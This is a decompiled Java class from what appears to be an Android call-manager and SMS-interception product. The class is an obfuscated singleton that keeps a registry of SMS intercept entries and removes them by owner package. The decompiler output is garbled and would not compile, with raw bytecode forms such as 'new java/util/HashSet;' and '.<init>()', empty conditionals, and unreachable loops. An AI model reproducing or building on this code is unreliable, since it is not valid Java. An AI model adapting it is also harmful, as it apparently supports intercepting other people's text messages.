package com.vvt.callmanager.ref;

import com.vvt.base.communication.SmsInterceptInfo;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;

public class i
{
  private static final boolean a = j.b;
  private static final boolean b = j.a;
  private static i c;
  private HashSet d;
  private HashSet e;
  private HashSet f;
  
  private i()
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.d = localHashSet;
    localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.e = localHashSet;
    localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    this.f = localHashSet;
  }
  
  public static i a()
  {
    i locali = c;
    if (locali == null)
    {
      locali = new com/vvt/callmanager/ref/i;
      locali.<init>();
      c = locali;
    }
    return c;
  }
  
  public boolean a(SmsInterceptInfo paramSmsInterceptInfo)
  {
    boolean bool1 = false;
    HashSet localHashSet1 = null;
    if (paramSmsInterceptInfo != null) {}
    synchronized (this.e)
    {
      localHashSet1 = this.e;
      bool1 = localHashSet1.add(paramSmsInterceptInfo);
      boolean bool2;
      if (bool1)
      {
        bool2 = a;
        if (!bool2) {}
      }
      do
      {
        return bool1;
        bool2 = a;
      } while (!bool2);
    }
  }
  
  public boolean a(String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    boolean bool3 = false;
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    Object localObject5;
    synchronized (this.e)
    {
      Object localObject2 = this.e;
      localObject5 = ((HashSet)localObject2).iterator();
      do
      {
        bool1 = ((Iterator)localObject5).hasNext();
        if (!bool1) {
          break;
        }
        localObject2 = ((Iterator)localObject5).next();
        localObject2 = (SmsInterceptInfo)localObject2;
        bool4 = b;
        if (bool4) {}
        bool4 = b;
        if (bool4) {}
        String str = ((SmsInterceptInfo)localObject2).getOwnerPackage();
        bool4 = paramString.equals(str);
      } while (!bool4);
      boolean bool4 = a;
      if (bool4) {}
      ((ArrayList)localObject1).add(localObject2);
    }
    int i = ((ArrayList)localObject1).size();
    if (i > 0)
    {
      i = 1;
      bool3 = i;
    }
    localObject1 = ((ArrayList)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject1).hasNext();
      if (!bool2) {
        break;
      }
      Object localObject4 = ((Iterator)localObject1).next();
      localObject4 = (SmsInterceptInfo)localObject4;
      boolean bool5 = a;
      if (bool5) {}
      localObject5 = this.e;
      ((HashSet)localObject5).remove(localObject4);
    }
    boolean bool2 = b;
    if (bool2) {}
    return bool3;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/i.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */